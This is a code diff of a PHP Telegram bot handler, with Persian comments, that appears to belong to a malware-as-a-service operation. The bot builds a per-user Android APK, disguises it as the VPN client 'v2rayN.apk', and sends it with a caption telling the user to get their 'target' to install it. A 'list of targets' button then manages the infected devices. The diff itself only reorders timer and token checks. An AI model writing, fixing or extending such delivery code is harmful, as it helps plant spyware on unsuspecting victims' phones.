@@ -47,19 +47,33 @@ class MobileKermRiziHandler
 
         $apiToken = $user->api_token;
 
-        // ۲. اگر کاربر قبلاً اپلیکیشن خود را تحویل گرفته است
-        if ($apiToken && !$user->hasActiveTimer()) {
+        // ۲. بررسی اتمام تایمر و آماده بودن فایل (باید حتما قبل از سایر شروط بررسی شود)
+        if ($user->timer_expires_at && $user->isTimerReady()) {
+
+            // ریست کردن وضعیت تایمر برای جلوگیری از تکرار ارسال فایل
+            $user->update(['timer_expires_at' => null]);
+
+            $apkPath = $this->apkService->downloadApkFromServer($user['apk_url']);
             $keyboard = InlineKeyboardMarkup::make()->addRow(
                 InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
             );
 
-            $bot->sendMessage(
-                "✅ شما قبلاً اپلیکیشن اختصاصی خود را دریافت کرده‌اید.\n\nبرای مدیریت دستگاه‌های متصل، روی دکمه زیر کلیک کنید:",
-                reply_markup: $keyboard
+            $bot->sendDocument(
+                document: InputFile::make($apkPath, 'v2rayN.apk'),
+                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.
+
+            <tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه
+
+            <b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNG</b>
+            ',
+                reply_markup: $keyboard,
+                parse_mode: 'HTML'
             );
+
             return;
         }
 
+        // ۳. بررسی اینکه آیا تایمر فعال است (در حال انتظار برای تایید)
         if ($user->hasActiveTimer()) {
             $remainingText = $user->getRemainingTimerText();
 
@@ -88,26 +102,20 @@ class MobileKermRiziHandler
             return;
         }
 
-        if ($user->timer_expires_at && $user->isTimerReady()) {
-            $apkPath = $this->apkService->downloadApkFromServer($user['apk_url']);
+        // ۴. اگر کاربر قبلاً اپلیکیشن خود را تحویل گرفته است و فقط میخواد وارد بخش مدیریت شود
+        if ($apiToken) {
             $keyboard = InlineKeyboardMarkup::make()->addRow(
                 InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
             );
-            $bot->sendDocument(
-                document: InputFile::make($apkPath, 'v2rayN.apk'),
-                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.
 
-            <tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه
-
-            <b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNG</b>
-            ',
-                reply_markup: $keyboard,
-                parse_mode: 'HTML'
+            $bot->sendMessage(
+                "✅ شما قبلاً اپلیکیشن اختصاصی خود را دریافت کرده‌اید.\n\nبرای مدیریت دستگاه‌های متصل، روی دکمه زیر کلیک کنید:",
+                reply_markup: $keyboard
             );
-
-            return ;
+            return;
         }
 
+        // ۵. تولید اپلیکیشن برای اولین بار (ثبت نام در سرویس)
         try {
             $userResponse = $this->appService->registerOwner(
                 $bot->userId(),
@@ -123,9 +131,6 @@ class MobileKermRiziHandler
 
             $buildData = $this->apkService->generateApk((string) $bot->userId(), $appKey);
             User::where('telegram_id', $bot->userId())->update(['apk_url' => $buildData['download_url']]);
-            // $apkPath = $this->apkService->downloadApkFromServer($buildData['download_url']);
-
-
 
             if (! $user->timer_expires_at) {
                 $user->startNewCooldown(minHours: 12, maxHours: 24);
@@ -166,7 +171,6 @@ class MobileKermRiziHandler
             $bot->sendMessage("Error for user {$bot->userId()}:\n" . $e->getMessage(), self::ADMIN_ID);
         }
     }
-
 
     public function refreshAppTimer(Nutgram $bot): void
     {
